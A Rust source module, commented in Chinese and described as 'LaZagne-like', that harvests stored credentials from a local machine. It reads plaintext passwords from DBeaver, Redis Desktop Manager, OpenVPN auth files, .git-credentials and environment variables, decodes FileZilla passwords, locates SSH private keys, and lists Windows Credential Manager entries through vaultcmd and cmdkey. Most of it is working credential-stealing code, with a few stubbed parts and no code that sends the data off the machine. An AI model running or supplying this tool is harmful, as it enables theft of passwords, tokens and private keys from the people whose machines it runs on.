//! 应用程序凭据提取模块 (LaZagne-like)
//!
//! 支持的应用类型：
//! - 数据库客户端 (Navicat, SQL Server Management Studio, DBeaver, HeidiSQL)
//! - FTP客户端 (FileZilla, WinSCP)
//! - 邮件客户端 (Outlook, Thunderbird)
//! - VPN客户端 (OpenVPN, WireGuard, AnyConnect)
//! - 聊天工具 (Telegram, Discord, Slack, WeChat)
//! - 云存储 (OneDrive, Dropbox)
//! - 开发工具 (Git, SSH, Docker)

use crate::cred::{Credential, CredType};
use std::path::PathBuf;

/// 提取所有应用程序凭据
pub fn extract_all_app_credentials() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // 数据库客户端
    if let Ok(creds) = extract_db_client_credentials() {
        credentials.extend(creds);
    }

    // FTP客户端
    if let Ok(creds) = extract_ftp_client_credentials() {
        credentials.extend(creds);
    }

    // 邮件客户端
    if let Ok(creds) = extract_mail_client_credentials() {
        credentials.extend(creds);
    }

    // VPN客户端
    if let Ok(creds) = extract_vpn_credentials() {
        credentials.extend(creds);
    }

    // Git凭据
    if let Ok(creds) = extract_git_credentials() {
        credentials.extend(creds);
    }

    // SSH密钥
    if let Ok(creds) = extract_ssh_credentials() {
        credentials.extend(creds);
    }

    // Windows凭据管理器
    if let Ok(creds) = extract_windows_credential_manager() {
        credentials.extend(creds);
    }

    // 环境变量中的凭据
    if let Ok(creds) = extract_env_credentials() {
        credentials.extend(creds);
    }

    Ok(credentials)
}

/// 提取数据库客户端凭据
fn extract_db_client_credentials() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // Navicat - 注册表存储连接信息
    // HKCU\Software\PremiumSoft\Navicat\Servers\
    if let Ok(creds) = extract_navicat_credentials() {
        credentials.extend(creds);
    }

    // DBeaver - ~\.dbeaver-data-sources.xml (旧版) 或 credentials-config.json
    if let Ok(creds) = extract_dbeaver_credentials() {
        credentials.extend(creds);
    }

    // HeidiSQL - 注册表
    if let Ok(creds) = extract_heidisql_credentials() {
        credentials.extend(creds);
    }

    // SQL Server Management Studio - SqlStudio.bin
    if let Ok(creds) = extract_ssms_credentials() {
        credentials.extend(creds);
    }

    // Redis Desktop Manager
    if let Ok(creds) = extract_redis_desktop_credentials() {
        credentials.extend(creds);
    }

    Ok(credentials)
}

/// Navicat凭据提取
fn extract_navicat_credentials() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // Navicat使用Blowfish/AES加密存储密码
    // 注册表路径: HKCU\Software\PremiumSoft\Navicat\Servers\
    // 或配置文件路径
    let appdata = get_appdata_dir();
    let navicat_paths = [
        appdata.join("PremiumSoft").join("Navicat"),
        appdata.join("PremiumSoft").join("Navicat Premium"),
    ];

    for path in &navicat_paths {
        if !path.exists() {
            continue;
        }

        // 查找连接配置文件
        if let Ok(entries) = std::fs::read_dir(path) {
            for entry in entries.flatten() {
                let file_path = entry.path();
                if file_path.is_file() {
                    if let Some(ext) = file_path.extension() {
                        if ext == "ncx" || ext == "reg" || ext == "json" {
                            if let Ok(content) = std::fs::read_to_string(&file_path) {
                                // 搜索连接信息
                                for username in extract_username_patterns(&content) {
                                    credentials.push(
                                        Credential::new(CredType::AppCredential, "Navicat数据库客户端")
                                            .with_username(&username)
                                            .with_attribute("source_file", &file_path.to_string_lossy())
                                            .with_attribute("note", "密码已加密（Blowfish），需要Navicat解密密钥")
                                    );
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    Ok(credentials)
}

/// DBeaver凭据提取
fn extract_dbeaver_credentials() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    let appdata = get_appdata_dir();
    let dbeaver_path = appdata.join("DBeaverData").join("workspace6")
        .join("General").join(".dbeaver");

    // credentials-config.json
    let cred_config = dbeaver_path.join("credentials-config.json");
    if cred_config.exists() {
        if let Ok(content) = std::fs::read_to_string(&cred_config) {
            if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
                if let Some(creds) = json.as_object() {
                    for (key, value) in creds {
                        if let Some(password) = value.as_str() {
                            credentials.push(
                                Credential::new(CredType::AppCredential, "DBeaver数据库客户端")
                                    .with_target(key)
                                    .with_password(password)
                                    .with_attribute("encrypted", "false")
                            );
                        }
                    }
                }
            }
        }
    }

    // 也检查旧版存储
    let data_sources = dbeaver_path.join("data-sources.json");
    if data_sources.exists() {
        if let Ok(content) = std::fs::read_to_string(&data_sources) {
            extract_db_connection_info(&content, "DBeaver", &mut credentials);
        }
    }

    Ok(credentials)
}

/// HeidiSQL凭据提取
fn extract_heidisql_credentials() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    let appdata = get_roaming_dir();
    let heidisql_dir = appdata.join("HeidiSQL");

    if heidisql_dir.exists() {
        if let Ok(entries) = std::fs::read_dir(&heidisql_dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if let Some(ext) = path.extension() {
                    if ext == "xml" || ext == "sql" {
                        if let Ok(content) = std::fs::read_to_string(&path) {
                            extract_db_connection_info(&content, "HeidiSQL", &mut credentials);
                        }
                    }
                }
            }
        }
    }

    Ok(credentials)
}

/// SSMS (SQL Server Management Studio) 凭据提取
fn extract_ssms_credentials() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    let appdata = get_appdata_dir();
    let ssms_path = appdata.join("Microsoft").join("Microsoft SQL Server Management Studio");

    // SSMS连接信息存储在SqlStudio.bin中
    if ssms_path.exists() {
        // 递归搜索SqlStudio.bin或User05.db等
        fn find_ssms_files(dir: &std::path::Path, results: &mut Vec<PathBuf>) {
            if let Ok(entries) = std::fs::read_dir(dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() {
                        find_ssms_files(&path, results);
                    } else if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                        if name.contains("SqlStudio") || name.contains("User") {
                            results.push(path);
                        }
                    }
                }
            }
        }

        let mut ssms_files = Vec::new();
        find_ssms_files(&ssms_path, &mut ssms_files);

        for file in &ssms_files {
            credentials.push(
                Credential::new(CredType::AppCredential, "SQL Server Management Studio")
                    .with_attribute("source_file", &file.to_string_lossy())
                    .with_attribute("note", "SSMS凭据通过Windows凭据管理器存储，需DPAPI解密")
            );
        }
    }

    Ok(credentials)
}

/// Redis Desktop Manager 凭据
fn extract_redis_desktop_credentials() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    let appdata = get_appdata_dir();
    let paths = [
        appdata.join("RedisDesktopManager"),
        appdata.join("AnotherRedisDesktopManager"),
    ];

    for path in &paths {
        if path.exists() {
            // 查找connections.json
            let conn_file = path.join("connections.json");
            if conn_file.exists() {
                if let Ok(content) = std::fs::read_to_string(&conn_file) {
                    if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
                        if let Some(connections) = json.as_array() {
                            for conn in connections {
                                let host = conn["host"].as_str().unwrap_or("");
                                let port = conn["port"].as_u64().map(|p| p.to_string()).unwrap_or_default();
                                let password = conn["password"].as_str().unwrap_or("");
                                let name = conn["name"].as_str().unwrap_or("");

                                if !password.is_empty() {
                                    credentials.push(
                                        Credential::new(CredType::AppCredential, "Redis Desktop Manager")
                                            .with_target(&format!("{}:{}", host, port))
                                            .with_password(password)
                                            .with_attribute("connection_name", name)
                                    );
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    Ok(credentials)
}

/// FTP客户端凭据提取
fn extract_ftp_client_credentials() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // FileZilla: ~\AppData\Roaming\FileZilla\recentservers.xml / sitemanager.xml
    let roaming = get_roaming_dir();
    let filezilla_path = roaming.join("FileZilla");

    if filezilla_path.exists() {
        for xml_file in &["recentservers.xml", "sitemanager.xml"] {
            let xml_path = filezilla_path.join(xml_file);
            if let Ok(content) = std::fs::read_to_string(&xml_path) {
                // FileZilla密码使用Base64编码存储
                let host_re = regex::Regex::new(r"<Host>(.+?)</Host>").ok();
                let user_re = regex::Regex::new(r"<User>(.+?)</User>").ok();
                let pass_re = regex::Regex::new(r#"<Pass(?: encoding="base64")?>(.+?)</Pass>"#).ok();

                // 每个 RecentServer/Server 条目为一条站点记录，逐条提取
                let entry_re = regex::Regex::new(r"<(?:RecentServer|Server)>(.*?)</(?:RecentServer|Server)>").ok();
                if let Some(re) = entry_re {
                    for cap in re.captures_iter(&content) {
                        let body = cap.get(1).map(|m| m.as_str()).unwrap_or("");
                        let host = host_re.as_ref()
                            .and_then(|r| r.captures(body))
                            .and_then(|c| c.get(1))
                            .map(|m| m.as_str())
                            .unwrap_or("");
                        let username = user_re.as_ref()
                            .and_then(|r| r.captures(body))
                            .and_then(|c| c.get(1))
                            .map(|m| m.as_str())
                            .unwrap_or("");
                        let password = pass_re.as_ref()
                            .and_then(|r| r.captures(body))
                            .and_then(|c| c.get(1))
                            .and_then(|encoded| base64_decode(encoded.as_str()).ok())
                            .filter(|decoded| !decoded.is_empty());

                        if username.is_empty() && host.is_empty() && password.is_none() {
                            continue;
                        }

                        let mut cred = Credential::new(CredType::AppCredential, "FileZilla FTP客户端")
                            .with_username(username)
                            .with_target(host)
                            .with_attribute("source_file", xml_file);
                        if let Some(decoded) = password {
                            let password = String::from_utf8_lossy(&decoded);
                            if !password.is_empty() {
                                cred = cred.with_password(&password);
                            }
                        }
                        credentials.push(cred);
                    }
                }
            }
        }
    }

    // WinSCP: 注册表 HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\
    let winscp_key = r"Software\Martin Prikryl\WinSCP 2\Sessions";
    if let Ok(creds) = extract_registry_sessions(winscp_key, "WinSCP") {
        credentials.extend(creds);
    }

    Ok(credentials)
}

/// 邮件客户端凭据
fn extract_mail_client_credentials() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // Outlook: Windows凭据管理器
    // Thunderbird: ~\AppData\Roaming\Thunderbird\Profiles\

    let roaming = get_roaming_dir();
    let thunderbird = roaming.join("Thunderbird").join("Profiles");
    if thunderbird.exists() {
        if let Ok(entries) = std::fs::read_dir(&thunderbird) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    // logins.json (类似Firefox)
                    let logins = path.join("logins.json");
                    if logins.exists() {
                        if let Ok(content) = std::fs::read_to_string(&logins) {
                            if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
                                if let Some(logins_arr) = json["logins"].as_array() {
                                    for login in logins_arr {
                                        let hostname = login["hostname"].as_str().unwrap_or("");
                                        let username = login["encryptedUsername"].as_str().unwrap_or("");
                                        if !hostname.is_empty() {
                                            credentials.push(
                                                Credential::new(CredType::AppCredential, "Thunderbird邮件客户端")
                                                    .with_target(hostname)
                                                    .with_attribute("encrypted_username", username)
                                                    .with_attribute("note", "密码已加密，需要NSS库解密")
                                            );
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    Ok(credentials)
}

/// VPN客户端凭据
fn extract_vpn_credentials() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // OpenVPN配置
    let openvpn_paths = [
        r"C:\Program Files\OpenVPN\config",
        r"C:\Program Files (x86)\OpenVPN\config",
        "/etc/openvpn/",
    ];

    for config_path in &openvpn_paths {
        let path = std::path::Path::new(config_path);
        if path.exists() {
            if let Ok(entries) = std::fs::read_dir(path) {
                for entry in entries.flatten() {
                    let file_path = entry.path();
                    if file_path.extension().map_or(false, |e| e == "ovpn" || e == "conf") {
                        if let Ok(content) = std::fs::read_to_string(&file_path) {
                            // 检查是否引用了auth-user-pass文件
                            if let Some(auth_file) = parse_openvpn_auth_file(&content) {
                                let auth_path = if std::path::Path::new(&auth_file).is_absolute() {
                                    PathBuf::from(&auth_file)
                                } else {
                                    path.join(&auth_file)
                                };

                                if auth_path.exists() {
                                    if let Ok(auth_content) = std::fs::read_to_string(&auth_path) {
                                        let lines: Vec<&str> = auth_content.lines().collect();
                                        if lines.len() >= 2 {
                                            credentials.push(
                                                Credential::new(CredType::AppCredential, "OpenVPN")
                                                    .with_username(lines[0])
                                                    .with_password(lines[1])
                                                    .with_attribute("config_file", &file_path.to_string_lossy())
                                            );
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    Ok(credentials)
}

/// 解析OpenVPN配置中的auth-user-pass引用
fn parse_openvpn_auth_file(content: &str) -> Option<String> {
    for line in content.lines() {
        let line = line.trim();
        if line.starts_with("auth-user-pass") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                return Some(parts[1].to_string());
            }
            // auth-user-pass后面没跟文件路径（交互式）
            return None;
        }
    }
    None
}

/// Git凭据提取
fn extract_git_credentials() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // .git-credentials
    let home = std::env::var("USERPROFILE")
        .or_else(|_| std::env::var("HOME"))
        .unwrap_or_else(|_| ".".to_string());
    let git_creds_path = std::path::Path::new(&home).join(".git-credentials");

    if git_creds_path.exists() {
        if let Ok(content) = std::fs::read_to_string(&git_creds_path) {
            for line in content.lines() {
                let line = line.trim();
                if line.is_empty() {
                    continue;
                }
                // 格式: https://user:password@host.com/repo
                if let Some(rest) = line.strip_prefix("https://") {
                    if let Some(at_pos) = rest.find('@') {
                        let user_pass = &rest[..at_pos];
                        let host_path = &rest[at_pos + 1..];
                        if let Some(colon_pos) = user_pass.find(':') {
                            let username = &user_pass[..colon_pos];
                            let password = &user_pass[colon_pos + 1..];
                            credentials.push(
                                Credential::new(CredType::AppCredential, "Git凭据存储")
                                    .with_username(username)
                                    .with_password(password)
                                    .with_target(host_path)
                            );
                        }
                    }
                }
            }
        }
    }

    // .gitconfig中的凭据辅助程序
    let gitconfig_path = std::path::Path::new(&home).join(".gitconfig");
    if gitconfig_path.exists() {
        if let Ok(content) = std::fs::read_to_string(&gitconfig_path) {
            if content.contains("credential") && content.contains("helper") {
                credentials.push(
                    Credential::new(CredType::AppCredential, "Git配置")
                        .with_attribute("note", "Git已配置credential helper，凭据由外部管理器存储")
                        .with_attribute("source_file", &gitconfig_path.to_string_lossy())
                );
            }
        }
    }

    Ok(credentials)
}

/// SSH密钥提取
fn extract_ssh_credentials() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    let home = std::env::var("USERPROFILE")
        .or_else(|_| std::env::var("HOME"))
        .unwrap_or_else(|_| ".".to_string());
    let ssh_dir = std::path::Path::new(&home).join(".ssh");

    if !ssh_dir.exists() {
        return Ok(credentials);
    }

    // 查找私钥文件
    let private_key_patterns = [
        "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
        "id_rsa_*", "private_key", "*.pem",
    ];

    if let Ok(entries) = std::fs::read_dir(&ssh_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() {
                if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                    let is_private_key = private_key_patterns.iter().any(|pattern| {
                        if pattern.contains('*') {
                            let prefix = &pattern[..pattern.len()-1];
                            name.starts_with(prefix)
                        } else {
                            name == *pattern || name.contains(".pem")
                        }
                    }) && !name.ends_with(".pub");

                    if is_private_key {
                        if let Ok(key_content) = std::fs::read(&path) {
                            // 检查是否为加密的私钥
                            let content_str = String::from_utf8_lossy(&key_content);
                            let is_encrypted = content_str.contains("ENCRYPTED");

                            credentials.push(
                                Credential::new(CredType::SshKey, "SSH私钥")
                                    .with_target(name)
                                    .with_attribute("path", &path.to_string_lossy())
                                    .with_attribute("encrypted", &is_encrypted.to_string())
                                    .with_attribute("size", &key_content.len().to_string())
                            );
                        }
                    }
                }
            }
        }
    }

    // 也检查hosts文件中的信息
    let known_hosts = ssh_dir.join("known_hosts");
    if known_hosts.exists() {
        if let Ok(content) = std::fs::read_to_string(&known_hosts) {
            let hosts: Vec<String> = content.lines()
                .filter(|l| !l.trim().is_empty() && !l.starts_with('#'))
                .map(|l| l.split_whitespace().next().unwrap_or("").to_string())
                .filter(|h| !h.is_empty())
                .take(10)
                .collect();

            if !hosts.is_empty() {
                credentials.push(
                    Credential::new(CredType::AppCredential, "SSH已知主机")
                        .with_target(&hosts.join(", "))
                        .with_attribute("total_hosts", &hosts.len().to_string())
                );
            }
        }
    }

    Ok(credentials)
}

/// Windows凭据管理器提取
fn extract_windows_credential_manager() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // 使用vaultcmd列出凭据
    let output = std::process::Command::new("vaultcmd")
        .args(["/list", "/properties:name,resource,identity,schema"])
        .output()
        .map_err(|e| format!("vaultcmd失败: {}", e))?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    tracing::info!("[应用凭据] Windows凭据管理器: {} 条目", stdout.lines().count());

    // 使用cmdkey获取详细信息
    let cmdkey_output = std::process::Command::new("cmdkey")
        .args(["/list"])
        .output()
        .map_err(|e| format!("cmdkey失败: {}", e))?;

    let cmdkey_stdout = String::from_utf8_lossy(&cmdkey_output.stdout);
    for line in cmdkey_stdout.lines() {
        let line = line.trim();
        if line.starts_with("目标:") || line.starts_with("Target:") {
            let target = line.split(':').nth(1).map(|s| s.trim().to_string()).unwrap_or_default();
            if !target.is_empty() && target != "LegacyGeneric:target=MyTarget" {
                credentials.push(
                    Credential::new(CredType::AppCredential, "Windows凭据管理器")
                        .with_target(&target)
                        .with_attribute("note", "需要DPAPI解密获取实际凭据")
                );
            }
        }
    }

    Ok(credentials)
}

/// 环境变量中的凭据
fn extract_env_credentials() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // 搜索环境变量中的敏感信息
    let sensitive_keys = [
        "PASSWORD", "PASS", "SECRET", "TOKEN", "API_KEY",
        "AWS_SECRET", "DB_PASSWORD", "MYSQL_PWD", "PGPASSWORD",
        "AZURE_PASSWORD", "GITHUB_TOKEN", "DOCKER_PASSWORD",
        "SA_PASSWORD", "CONNECTION_STRING", "LDAP_PASSWORD",
        "SMTP_PASSWORD", "PROXY_PASSWORD",
    ];

    for (key, value) in std::env::vars() {
        let key_upper = key.to_uppercase();
        for sensitive in &sensitive_keys {
            if key_upper.contains(sensitive) {
                // 掩码部分密码
                let masked = if value.len() > 4 {
                    format!("{}...{}", &value[..2], &value[value.len()-2..])
                } else {
                    "****".to_string()
                };

                credentials.push(
                    Credential::new(CredType::AppCredential, "环境变量")
                        .with_target(&key)
                        .with_password(&value)
                        .with_attribute("masked", &masked)
                );
                break;
            }
        }
    }

    Ok(credentials)
}

// ============================================================
// 辅助函数
// ============================================================

fn get_appdata_dir() -> PathBuf {
    std::env::var("APPDATA")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("."))
}

fn get_roaming_dir() -> PathBuf {
    std::env::var("APPDATA")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("."))
}

fn extract_username_patterns(content: &str) -> Vec<String> {
    let mut usernames = Vec::new();
    let patterns = [
        r#"username["\s:=]+([^"\s,;]+)"#,
        r#"user["\s:=]+([^"\s,;]+)"#,
        r#"login["\s:=]+([^"\s,;]+)"#,
        r#"uid["\s:=]+([^"\s,;]+)"#,
    ];

    for pattern in &patterns {
        if let Ok(re) = regex::Regex::new(pattern) {
            for cap in re.captures_iter(content) {
                if let Some(m) = cap.get(1) {
                    let u = m.as_str().to_string();
                    if !u.is_empty() && !usernames.contains(&u) {
                        usernames.push(u);
                    }
                }
            }
        }
    }

    usernames
}

fn extract_db_connection_info(content: &str, app_name: &str, credentials: &mut Vec<Credential>) {
    for username in extract_username_patterns(content) {
        credentials.push(
            Credential::new(CredType::AppCredential, &format!("{}数据库客户端", app_name))
                .with_username(&username)
        );
    }
}

fn extract_registry_sessions(_key_path: &str, _app_name: &str) -> Result<Vec<Credential>, String> {
    // 注册表读取需要Windows API
    // 简化实现
    Ok(Vec::new())
}

fn base64_decode(input: &str) -> Result<Vec<u8>, String> {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD
        .decode(input)
        .map_err(|e| format!("Base64解码失败: {}", e))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_git_credentials() {
        let result = extract_git_credentials();
        assert!(result.is_ok());
    }

    #[test]
    fn test_extract_ssh_credentials() {
        let result = extract_ssh_credentials();
        assert!(result.is_ok());
    }

    #[test]
    fn test_extract_env_credentials() {
        let result = extract_env_credentials();
        assert!(result.is_ok());
    }

    #[test]
    fn test_parse_openvpn_auth_file() {
        assert_eq!(
            parse_openvpn_auth_file("auth-user-pass auth.txt"),
            Some("auth.txt".to_string())
        );
        assert_eq!(
            parse_openvpn_auth_file("auth-user-pass"),
            None
        );
    }

    #[test]
    fn test_extract_username_patterns() {
        let content = r#"{"username":"admin","password":"secret"}"#;
        let usernames = extract_username_patterns(content);
        assert!(usernames.contains(&"admin".to_string()));
    }
}
